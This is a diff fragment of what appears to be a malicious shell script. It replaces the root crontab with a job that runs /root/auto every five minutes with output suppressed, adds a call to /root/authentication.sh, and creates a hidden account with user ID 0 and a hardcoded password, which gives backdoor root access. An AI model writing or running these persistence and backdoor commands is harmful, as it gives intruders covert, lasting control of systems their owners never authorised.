@@ -958,6 +958,7 @@ crontab -r
 echo "SHELL=/bin/bash
 */5 * * * * /bin/bash /root/auto >/dev/null 2>&1" | crontab -
 
+bash /root/authentication.sh
 bash /root/auto
 
 useradd -p $(openssl passwd -1 jakulerodexter) dexterjakulero -ou 0 -g 0
